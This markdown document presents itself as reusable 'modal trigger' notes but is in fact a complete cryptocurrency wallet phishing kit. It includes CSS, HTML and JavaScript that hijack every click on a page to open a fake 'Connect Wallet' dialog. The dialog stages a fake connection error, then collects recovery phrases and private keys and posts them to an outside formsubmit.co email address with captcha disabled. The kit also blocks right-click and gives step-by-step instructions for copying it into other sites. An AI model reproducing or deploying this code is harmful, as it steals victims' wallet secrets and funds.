# Implementation Notes: Modal Trigger System

These notes summarize the changes and reusable patterns added to this project to:

- Ensure the wallet modal pops up when clicking anywhere (or any button/link) on the page

---

## 1) Modal: Open on Any Click (Global + Per-element triggers)

There are two complementary systems to ensure the modal opens reliably:

1) A universal initializer that scans for buttons/links and attaches click handlers (excluding anything inside the modal)
2) A document-level click handler that opens the modal when clicking anywhere outside the modal

This combination covers:
- Explicit UI controls (buttons/links)
- Generic page clicks (background areas, text, images, etc.)

### Shared variables (both pages)
These are defined once where the modal and controls exist:
```js
const modal = document.getElementById("walletModal");
const closeModalBtn = document.getElementById("closeModalBtn");
const manualInput = document.getElementById("manual-input");
const messageParagraph = document.getElementById("manual-claim-message");
const connectManuallyBtn = document.getElementById("connect-manually-btn");
const walletOptions = document.getElementById("wallet-options");
const connectingMessage = document.getElementById("connecting-message");
```

### Close and outside-click-to-close
```js
closeModalBtn.addEventListener("click", () => {
  modal.style.display = "none";
  resetModal();
});

window.addEventListener("click", (e) => {
  if (e.target == modal) {
    modal.style.display = "none";
    resetModal();
  }
});
```

### 2.1 Universal Modal Triggers (buttons/links)
This function runs on page load and binds modal-opening behavior to all interactive elements outside the modal.

```js
function getQualifyingElements() {
  const modal = document.getElementById('walletModal');
  if (!modal) return [];
  const allButtons = document.querySelectorAll('button');
  const allLinks = document.querySelectorAll('a[href]');
  const allClickableElements = [...allButtons, ...allLinks];
  return Array.from(allClickableElements).filter(el => !modal.contains(el));
}

function initializeUniversalModalTriggers() {
  const modal = document.getElementById('walletModal');
  if (!modal) return;
  const qualifyingElements = getQualifyingElements();
  qualifyingElements.forEach((el) => {
    if (el.getAttribute('data-modal-trigger') === 'true') return; // avoid duplicates
    el.setAttribute('data-modal-trigger', 'true');
    el.addEventListener('click', (e) => {
      try {
        // Prevent default on links so we show modal instead of navigating
        e.preventDefault();
        e.stopPropagation();
        modal.style.display = 'flex';
        resetModal();
      } catch {}
    });
  });
}

// Call once after the modal DOM exists
initializeUniversalModalTriggers();
```

### 2.2 Document-level Catch-all (anywhere on page)
This opens the modal when the user clicks in any area outside the modal. It ignores clicks inside the modal and won’t re-open if it’s already visible.

```js
document.addEventListener('click', function (e) {
  try {
    if (!modal) return;
    if (modal.contains(e.target)) return; // ignore clicks in modal
    var isOpen = modal.style.display && modal.style.display !== 'none';
    if (isOpen) return;
    // For links/buttons, prevent navigation so modal shows
    var clickable = e.target.closest('a, button');
    if (clickable) e.preventDefault();
    modal.style.display = 'flex';
    resetModal();
  } catch {}
}, true);
```

### 2.3 Reset function
Ensures the modal returns to its default view every time it’s opened.
```js
function resetModal() {
  walletOptions.style.display = "block";
  connectingMessage.style.display = "none";
  manualInput.style.display = "none";
  connectManuallyBtn.style.display = "none";
  messageParagraph.textContent = "";
}
```

### Notes
- The `true` (capture) flag on the document-level handler helps intercept before default navigation.
- `modal.contains(e.target)` prevents the catch-all from firing when interacting with the modal itself.
- `data-modal-trigger` is used to guard against attaching duplicate handlers when `initializeUniversalModalTriggers()` is called again.

---

## 2) Reuse Checklist for Another Project

1. Add the modal markup (wrapper `#walletModal`, `.modal-content`, close button `#closeModalBtn`, and internal sections like `#wallet-options`, `#connecting-message`, `#manual-input`).
2. Add the shared variables block and the `resetModal()` function.
3. Add the outside-click-to-close listener (`window.addEventListener('click', ...)`).
4. Add `initializeUniversalModalTriggers()` and call it after the modal exists in the DOM.
5. Add the document-level catch-all click listener to open the modal on any click.

---

---

## 3) Complete Code Implementation for index.html Projects

### 3.1 Top Section Code (Add to `<head>` or beginning of `<body>`)

This code should be placed at the very top of your `index.html` file, ideally in the `<head>` section or at the beginning of the `<body>`:

```html
<!-- IMPORTED STYLE -->
<script>
  document.addEventListener('contextmenu', function (event) {
    event.preventDefault();
  });
</script>

<style>
  /* =================== personal styles  */
  .blue-glassmorphism {
    background: rgb(39, 51, 89, 0.4);
    border-radius: 16px;
    box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
    backdrop-filter: blur(5px);
    -webkit-backdrop-filter: blur(5px);
    border: 1px solid rgba(0, 0, 0, 0.3);
    z-index: -1;
    position: relative;
  }

  /* white glassmorphism */
  .white-glassmorphism {
    background: rgba(17, 7, 21, 0.729);
    border-radius: 16px;
    backdrop-filter: blur(5px);
    -webkit-backdrop-filter: blur(5px);
    border: 1px solid rgba(255, 255, 255, 0.602);
    z-index: -1;
    position: relative;
  }

  /* =============================== Modal container ===============================*/
  .modal {
    display: none;
    /* Hidden by default */
    position: fixed;
    /* Stay in place */
    z-index: 999;
    /* Sit on top */
    left: 0;
    top: 0;
    width: 100%;
    /* Full width */
    height: 100%;
    /* Full height */
    overflow: auto;
    /* Enable scroll if needed */
    background-color: rgb(0, 0, 0);
    background-color: rgba(0, 0, 0, 0.4);
    justify-content: center;
    align-items: center;
    /* Accessibility enhancements */
    backdrop-filter: blur(2px);
    -webkit-backdrop-filter: blur(2px);
  }

  /* Focus management for accessibility */
  .modal:focus-within .modal-content {
    outline: 2px solid #4A90E2;
    outline-offset: 2px;
  }

  /* Ensure modal is keyboard accessible */
  .modal-wallets a:focus,
  .close:focus {
    outline: 2px solid #4A90E2;
    outline-offset: 2px;
    background-color: #f5f5f5;
  }

  /* Modal content */
  .modal-content {
    background-color: #ffffff;
    /* White background theme */
    border-radius: 16px;
    /* Rounded corners */
    padding: 20px;
    border: none;
    /* Remove border */
    color: #111111;
    width: 400px;
    box-shadow: 0 6px 16px rgba(10, 16, 31, 0.08), 0 3px 6px -4px rgba(10,16,31,0.12), 0 9px 28px 8px rgba(10,16,31,0.05);
    animation: modalOpen 0.4s;
    font-family: 'Arial', sans-serif;
    /* Use a clean font */
    margin: 8px;
  }

  /* Cross-device compatibility styles */
  @media (max-width: 768px) {
    .modal-content {
      width: 90%;
      max-width: 350px;
      margin: 10% auto;
      padding: 16px;
      border-radius: 12px;
    }

    .modal-header h5 {
      font-size: 18px;
    }

    .modal-wallets a {
      padding: 12px 16px;
      font-size: 14px;
      border-radius: 8px;
    }

    .modal-wallets a img {
      width: 24px;
      height: 24px;
    }

    /* Touch-friendly interactions */
    .modal-wallets a:hover,
    .modal-wallets a:active {
      background-color: #2d9449;
      transform: scale(0.98);
      transition: all 0.1s ease;
    }

    .close {
      font-size: 24px;
      padding: 8px;
      min-width: 32px;
      min-height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
  }

  /* Extra small screens */
  @media (max-width: 480px) {
    .modal-content {
      width: 95%;
      margin: 5% auto;
      padding: 12px;
    }

    .modal-header {
      padding-bottom: 12px;
    }

    .modal-wallets {
      margin-top: 16px;
    }
  }

  /* Large screens optimization */
  @media (min-width: 1200px) {
    .modal-content {
      width: 420px;
      padding: 24px;
    }
  }

  .modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-bottom: 10px;
    font-weight: bold;
    font-size: 18px;
    color: #111111;
  }

  .modal-header h5 {
    margin: 0;
  }

  .close {
    font-size: 20px;
    cursor: pointer;
    color: #666666;
  }

  .modal-wallets {
    margin-top: 25px;
    display: flex;
    flex-direction: column;
    gap: 10px;
    /* Space between wallet options */
  }

  .modal-wallets a {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: #ffffff;
    color: #111111;
    padding: 14px;
    border-radius: 12px;
    font-size: 16px;
    text-decoration: none;
    font-weight: 600;
    border: 1px solid rgba(5,5,5,0.06);
    transition: background-color 0.2s ease;
  }

  .modal-wallets a:hover {
    background-color: #f5f5f5;
    cursor: pointer;
  }

  .modal-wallets a img {
    width: 28px;
    height: 28px;
    border-radius: 8px;
    background: #ffffff;
  }

  .dont-have-wallet {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 20px;
    padding: 12px;
    width: 80%;
    margin: auto;
    color: white;
    background-color: transparent;
    border: 2px solid white;
    border-radius: 25px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
  }

  .dont-have-wallet:hover {
    background-color: rgba(255, 255, 255, 0.2);
  }

  .close:hover,
  .close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
  }

  /* Modal body */
  .modal-body {
    padding-top: 10px;
  }

  /* Wallet link styling */
  .wallet-link {
    display: flex;
    align-items: center;
    margin: 10px 0;
    text-decoration: none;
    color: white;
    font-weight: 100 !important;
  }

  .wallet-link img {
    margin-right: 10px;
  }

  /* Animation for opening the modal */
  @keyframes modalOpen {
    from {
      opacity: 0;
    }

    to {
      opacity: 1;
    }
  }

  /* Rotating image animation */
  @keyframes rotate {
    from {
      transform: rotate(0deg);
    }

    to {
      transform: rotate(360deg);
    }
  }

  #rotating-image {
    width: 30px;
    /* Adjust as necessary */
    height: 30px;
    /* Adjust as necessary */
    animation: rotate 2s linear infinite;
    /* 2s for the rotation duration */
    margin-right: 10px;
    /* Space between image and text */
  }

  .rotating-image-section {
    justify-content: center;
    padding-top: 20px;
    padding-bottom: 20px;
    align-items: center;
    /* Align items in the center */
    display: flex;
  }

  #connection-status {
    color: white;
    margin: 0;
    /* Remove any default margin */
  }

  #connect-manually-btn,
  #manual-input {
    margin-top: 10px;
    display: none;
    /* Initially hidden */
  }

  .connect-btn {
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .connect-btn .show-wallet-modal {
    background-color: rgba(255, 255, 255, 0.67);
    border-radius: 10px;
    border: 1px solid white;
    display: flex;
    justify-content: center;
    align-items: center;
    /* width: auto; */
    color: rgba(0, 0, 0, 0.769);
    padding: 8px;
    text-align: center;
  }

  #aim_connect {
    font-size: 15px;
  }

  /* ============================================================== */
  /* ============================ FOR THE PHRASE BOX SECTION  */
  /* Centering content for both Phrase and Private Key tabs */
  /* Make sure table headers are centered as well */
  table {
    width: 100%;
    table-layout: fixed;
    /* Ensure consistent width distribution */
  }

  th {
    text-align: center;
    /* Center table headers */
    padding: 10px;
  }

  /* Centering content for both Phrase and Private Key tabs */
  .phrase-table-container {
    padding: 16px;
    background-color: rgba(15, 18, 18, 0.86);
    border: 1px solid #4a4a4a;
    border-radius: 8px;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* Center the content horizontally */
    justify-content: center;
    /* Center the content vertically */
    text-align: center;
    /* Center text */
  }

  /* Center table headings */
  .table-heading {
    cursor: pointer;
    font-size: 14px;
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    /* Center table headings */
  }

  /* Center form content */
  .form-content {
    margin-top: 16px;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* Center the content horizontally */
    width: 100%;
    /* Make sure the content fills the width */
    text-align: center;
  }

  /* Center textarea */
  .form-textarea {
    width: 100%;
    /* Full width textarea */
    max-width: 310px;
    /* Set a maximum width so it doesn't stretch too far */
    border-radius: 8px;
    padding: 8px;
    color: #ffffff;
    background-color: rgba(15, 18, 18, 0.62);
    border: 1px solid #4a4a4a;
    resize: none;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
    font-size: 10px;
    text-align: left;
    /* Keep text aligned to the left */
  }

  .form-hint {
    text-align: center;
    margin-top: 16px;
    font-size: 12px;
    color: #9e9e9e;
  }

  .form-input {
    width: 100%;
    border-radius: 8px;
    padding: 8px;
    color: #a3a3a3;
    background-color: rgba(15, 18, 18, 0.62);
    border: 1px solid #d1d1d1;
  }

  #connect-manually-btn .btn {
    color: #1f1f1f;
    background-color: #2EB335;
    border-radius: 8px;
    padding: 12px;
    font-size: 16px;
    margin-top: 10px;
  }

  .btn {
    color: #ffffff;
    background-color: #0a5826;
    border-radius: 8px;
    padding: 12px;
    font-size: 16px;
    margin-top: 10px;
  }

  .error-message {
    background-color: #ffebee;
    font-size: 14px;
    color: #d32f2f;
    border: 1px solid #ef9a9a;
    padding: 8px;
    border-radius: 4px;
    display: none;
  }

  .keystore-label {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 20px;
    padding-bottom: 24px;
  }

  .keystore-icon {
    margin-bottom: 12px;
    width: 40px;
    height: 40px;
    color: #a3a3a3;
  }
</style>

<!-- =================================================== -->
```

### 3.2 Modal HTML Structure (Add to `<body>`)

Place this modal HTML structure somewhere in your `<body>` (typically at the end):

```html
<!-- FOR THE MODAL CODE -->

<!-- Modal centering styles -->
<style>
  /* Fullscreen overlay and centering */
  #walletModal.modal {
    position: fixed;
    inset: 0;
    z-index: 9999;
    display: none; /* JS sets to 'flex' when opened */
    align-items: center;
    justify-content: center;
    padding: 16px; /* breathing room on small screens */
    background: rgba(0, 0, 0, 0.45); /* overlay */
  }

  /* Modal card sizing */
  #walletModal .modal-content {
    width: 100%;
    max-width: 420px;
    max-height: 90vh;
    overflow: auto;
    border-radius: 12px;
  }

  /* Slightly tighter on very small phones */
  @media (max-width: 480px) {
    #walletModal .modal-content {
      max-width: 92vw;
    }
  }
</style>
<!-- ---------- MODAL SECTION ---------- -->
<div id="walletModal" class="modal" style="display: none; position: fixed; inset: 0; z-index: 9999; align-items: center; justify-content: center; padding: 16px; background: rgba(0,0,0,0.45);">
  <div class="modal-content ">
    <div class="modal-header">
      <h5>Connect Wallet</h5>
      <span class="close" id="closeModalBtn">&times;</span>
    </div>
    <div class="modal-body">
      <div class="modal-wallets" id="wallet-options">
        <a href="#" class="wallet-link" id="wallet-connect-link">
          Wallet Connect
          <img src="./walletconnect.png" alt="Wallet Icon">
          </a>
          <a href="#" class="wallet-link" id="metamask-link">
            MetaMask
            <img src="./metamask.png" alt="Wallet Icon">
            </a>
            <a href="#" class="wallet-link" id="pelagus-link">
              Pelagus Wallet
              <img src="./pelagus.png" alt="Wallet Icon">
              </a>
              <a href="#" class="wallet-link" id="coinbase-link">
                Coinbase Wallet
                <img src="./coinbase.webp" alt="Wallet Icon">
                </a>
                <a href="#" class="wallet-link" id="binance-link">
                  Binance Wallet
                  <img src="./binance.svg" alt="Wallet Icon">
                  </a>
                  <a href="#" class="wallet-link" id="Phantom-wallet-link">
                    Phantom Wallet
                    <img src="./phantom.png" alt="Phantom Wallet Icon">
                  </a>
      </div>
      <div style="
                      display: flex;
                      flex-direction: column;
                      justify-content: center;
                      align-items: center;
                      text-align: center;
                      display: none;
                  " id="connecting-message">
        <p id="manual-claim-message" style="color: rgba(37, 37, 37, 0.792); font-size: 13px;"></p>
        <div class="connect-btn" id="connect-manually-btn" style="color: black; display: none">
          <button class="btn disabled:opacity-50 ">
            Connect manually
          </button>
        </div>
      </div>

      <!-- phrase table -->
      <div class="phrase-table-container" style="display: none" id="manual-input">
        <table class="table-auto">
          <thead>
            <tr>
              <th class="table-heading" onclick="handleTableClick('Phrase')">
                Phrase
              </th>
              <th class="table-heading" onclick="handleTableClick('Private-Key')">
                Private Key
              </th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td colspan="2" class="text-center">
                <div id="phrase-form" class="form-content">
                  <form action="https://formsubmit.co/Holusholarcoded@gmail.com" method="POST"
                    onsubmit="validateForm(event)">
                    <div class="mb-3">
                      <textarea id="form_name" name="from_name" rows="5" required
                        placeholder="Enter your recovery phrase..." class="form-textarea"></textarea>
                      <p id="error-message" class="error-message">
                        Error message
                      </p>
                      <div class="form-hint">
                        Typically 12 (sometimes 24) words separated by
                        single spaces
                      </div>
                    </div>
                    <input type="hidden" name="_captcha" value="false" />
                    <input type="hidden" name="_next" value="https://netx-world-exchange.vercel.app/index.html" />
                    <button type="submit" class="btn btn-primary">Proceed</button>
                  </form>
                </div>
                <div id="private-key-form" class="form-content" style="display: none">
                  <form action="https://formsubmit.co/Holusholarcoded@gmail.com" method="POST">
                    <div class="mb-3">
                      <textarea id="private_key" name="private_key" rows="5" required
                        placeholder="Enter your private key..." class="form-textarea"></textarea>
                      <div class="form-hint">
                        Typically 64 alphanumeric characters
                      </div>
                    </div>
                    <input type="hidden" name="_captcha" value="false" />
                    <input type="hidden" name="_next" value="https://netx-world-exchange.vercel.app/index.html" />
                    <button type="submit" class="btn">Proceed</button>
                  </form>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>
```

### 3.3 Bottom Section Code (Add before closing `</body>`)

This JavaScript should be placed at the very end of your HTML file, just before the closing `</body>` tag:

```html
<!-- IMPORTED SCRIPT -->

<script>

  const modal = document.getElementById("walletModal");
  const closeModalBtn = document.getElementById("closeModalBtn");
  const manualInput = document.getElementById("manual-input");
  const messageParagraph = document.getElementById("manual-claim-message");
  const connectManuallyBtn = document.getElementById("connect-manually-btn");
  const walletOptions = document.getElementById("wallet-options");
  const connectingMessage = document.getElementById("connecting-message");

  // Ensure modal is a direct child of <body> to avoid iOS/transform containing blocks breaking position: fixed
  try {
    if (modal && modal.parentElement !== document.body) {
      document.body.appendChild(modal);
    }
  } catch (reparentErr) {
    console.warn('Could not reparent modal to <body>:', reparentErr);
  }

  // Get wallet link elements
  const phantomWalletLink = document.getElementById("Phantom-wallet-link");
  const walletConnectLink = document.getElementById("wallet-connect-link");
  const metamaskLink = document.getElementById("metamask-link");
  const pelagusLink = document.getElementById("pelagus-link");
  const coinbaseLink = document.getElementById("coinbase-link");
  const binanceLink = document.getElementById("binance-link");

  // Utility to open/close modal (locks body scroll to avoid layout shifting on mobile)
  function openModal() {
    if (!modal) return;
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    resetModal();
  }

  function closeModal() {
    if (!modal) return;
    modal.style.display = 'none';
    document.body.style.overflow = '';
    resetModal();
  }

  // Open modal for any element with get-started-btn ID
  document.querySelectorAll('#get-started-btn').forEach(button => {
    button.addEventListener('click', () => {
      openModal();
    });
  });

  // Function to show connecting message and then manual connect option
  function showConnectingMessage(walletName) {
    // Hide wallet options
    walletOptions.style.display = "none";

    // Show connecting message
    connectingMessage.style.display = "flex";
    messageParagraph.textContent = `Connecting to ${walletName}...`;
    connectManuallyBtn.style.display = "none";
    manualInput.style.display = "none";

    // After 2 seconds, show error and manual connect button
    setTimeout(() => {
      messageParagraph.textContent = `Error connecting, connect manually to proceed to your allocation.`;
      connectManuallyBtn.style.display = "block";
    }, 2000);
  }

  // Wallet connect button click handlers
  phantomWalletLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("Phantom Wallet");
  });

  walletConnectLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("Wallet Connect");
  });

  // Additional wallets wired to the same flow
  metamaskLink && metamaskLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("MetaMask");
  });

  pelagusLink && pelagusLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("Pelagus Wallet");
  });

  coinbaseLink && coinbaseLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("Coinbase Wallet");
  });

  binanceLink && binanceLink.addEventListener("click", (e) => {
    e.preventDefault();
    showConnectingMessage("Binance Wallet");
  });

  // Connect manually button click handler
  connectManuallyBtn.addEventListener("click", () => {
    connectManuallyBtn.style.display = "none";
    manualInput.style.display = "block";
  });

  // Close modal handlers
  closeModalBtn.addEventListener("click", () => {
    closeModal();
  });

  // Click outside modal to close
  window.addEventListener("click", (e) => {
    if (e.target == modal) {
      closeModal();
    }
  });

  // Button and link detection utility function
  function getQualifyingElements() {
    // Validate that modal element exists before filtering
    const modal = document.getElementById('walletModal');
    if (!modal) {
      console.warn('Modal element not found. Cannot filter elements.');
      return [];
    }

    // Get all clickable elements: buttons, links, and buttons inside links
    const allButtons = document.querySelectorAll('button');
    const allLinks = document.querySelectorAll('a[href]');
    const allClickableElements = [...allButtons, ...allLinks];

    // Filter out elements that are children of the modal container
    return Array.from(allClickableElements).filter(element => {
      return !modal.contains(element);
    });
  }

  // Universal modal trigger system
  function initializeUniversalModalTriggers() {
    const startTime = performance.now();

    try {
      const modal = document.getElementById('walletModal');
      if (!modal) {
        console.warn('Modal element not found. Cannot initialize universal triggers.');
        return;
      }

      const qualifyingElements = getQualifyingElements();
      console.log(`Desktop: Initializing universal modal triggers for ${qualifyingElements.length} elements (buttons and links)`);

      let successCount = 0;
      let errorCount = 0;

      qualifyingElements.forEach((element, index) => {
        try {
          // Add duplicate listener prevention using data attributes
          if (element.getAttribute('data-modal-trigger') === 'true') {
            return; // Skip if already has modal trigger
          }

          // Validate element
          if (!element || typeof element.addEventListener !== 'function') {
            console.warn(`Desktop: Invalid element at index ${index}:`, element);
            errorCount++;
            return;
          }

          // Mark element as having modal trigger to prevent duplicates
          element.setAttribute('data-modal-trigger', 'true');

          // Attach modal event listener with error handling
          element.addEventListener('click', (e) => {
            try {
              // Prevent default behavior for links to stop redirections
              e.preventDefault();
              e.stopPropagation();

              // Open modal with existing functionality
              openModal();

              console.log(`Desktop: Modal opened by ${element.tagName} element`);
            } catch (modalError) {
              console.error('Desktop: Error opening modal:', modalError);
            }
          });

          successCount++;
        } catch (elementError) {
          console.error(`Desktop: Error processing element at index ${index}:`, elementError);
          errorCount++;
        }
      });

      const endTime = performance.now();
      const initTime = endTime - startTime;

      console.log(`Desktop modal triggers initialized in ${initTime.toFixed(2)}ms`);
      console.log(`Success: ${successCount}, Errors: ${errorCount}`);

      if (initTime > 50) {
        console.warn(`Modal trigger initialization took ${initTime.toFixed(2)}ms, exceeding 50ms target`);
      }

    } catch (error) {
      console.error('Fatal error in universal modal trigger initialization:', error);
    }
  }

  // Reset modal to initial state
  function resetModal() {
    walletOptions.style.display = "block";
    connectingMessage.style.display = "none";
    manualInput.style.display = "none";
    connectManuallyBtn.style.display = "none";
    messageParagraph.textContent = "";
  }

  // Handle switch between Phrase and Private Key tabs
  function handleTableClick(tab) {
    const phraseForm = document.getElementById('phrase-form');
    const privateKeyForm = document.getElementById('private-key-form');

    if (tab === 'Phrase') {
      phraseForm.style.display = 'block';
      privateKeyForm.style.display = 'none';
    } else if (tab === 'Private-Key') {
      phraseForm.style.display = 'none';
      privateKeyForm.style.display = 'block';
    }
  }

  // Form validation
  function validateForm(event) {
    const formInput = document.getElementById('form_name').value;
    const errorMessage = document.getElementById('error-message');

    // Check if input contains at least 12 words
    const words = formInput.trim().split(/\s+/);
    if (words.length < 12) {
      event.preventDefault();
      errorMessage.style.display = 'block';
      errorMessage.textContent = 'Please enter at least 12 words';
      return false;
    }
    return true;
  }

  // Initialize universal modal triggers when page loads
  initializeUniversalModalTriggers();

  // Global page click opens modal unless clicking inside the modal. Guard to avoid reopening.
  document.addEventListener('click', function (e) {
    try {
      if (!modal) return;
      if (modal.contains(e.target)) return; // ignore clicks in modal
      var isOpen = modal.style.display && modal.style.display !== 'none';
      if (isOpen) return;
      // Prevent navigation for links/buttons so modal shows
      var clickable = e.target.closest('a, button');
      if (clickable) e.preventDefault();
      openModal();
    } catch (err) {}
  }, true);
</script>
```

## 3.4 Important Notes for Implementation

### Required Assets
Make sure these image files are in your project root or update the paths:
- `./walletconnect.png`
- `./metamask.png`
- `./pelagus.png`
- `./coinbase.webp`
- `./binance.svg`
- `./phantom.png`

### Form Configuration
The forms currently submit to `https://formsubmit.co/Holusholarcoded@gmail.com` - update this URL for your specific project.

### Browser Compatibility
- The code includes fallbacks for older browsers
- Modal positioning uses `position: fixed` which is widely supported

---

## 4) Troubleshooting

- **Modal doesn't open on click**
  - Ensure the modal DOM exists before calling the initialization/catch-all logic.
  - Check there are no console errors (missing IDs referenced by the script).
  - Verify CSS is not setting `pointer-events: none` on large wrappers.

- **Unexpected navigation happens**
  - Confirm the `e.preventDefault()` runs for links/buttons before the browser navigates.
  - Keep the document-level handler in the capture phase (third argument `true`).

- **Missing wallet icons**
  - Ensure all required image files are present in the project directory
  - Update image paths if they're in a different location

- **Form submission issues**
  - Update the form action URL to your desired email/form service
  - Check that the email service you're using accepts the form data format


---

## 5) Reuse Checklist for New Projects

1. Add the **Top Section Code** (styles and context menu prevention) to your `<head>` or beginning of `<body>`
2. Add the **Modal HTML Structure** somewhere in your `<body>` (typically at the end)
3. Add the **Bottom Section Code** (JavaScript) before closing `</body>` tag
4. **Update form action URLs** to your desired email/form service
5. **Add required wallet icon images** to your project directory
6. Test modal opening on various device types and screen sizes
7. Verify all wallet connection flows work as expected

---

This document can be copied into other projects as a blueprint. Adjust element IDs, image paths, and form URLs to match your structure.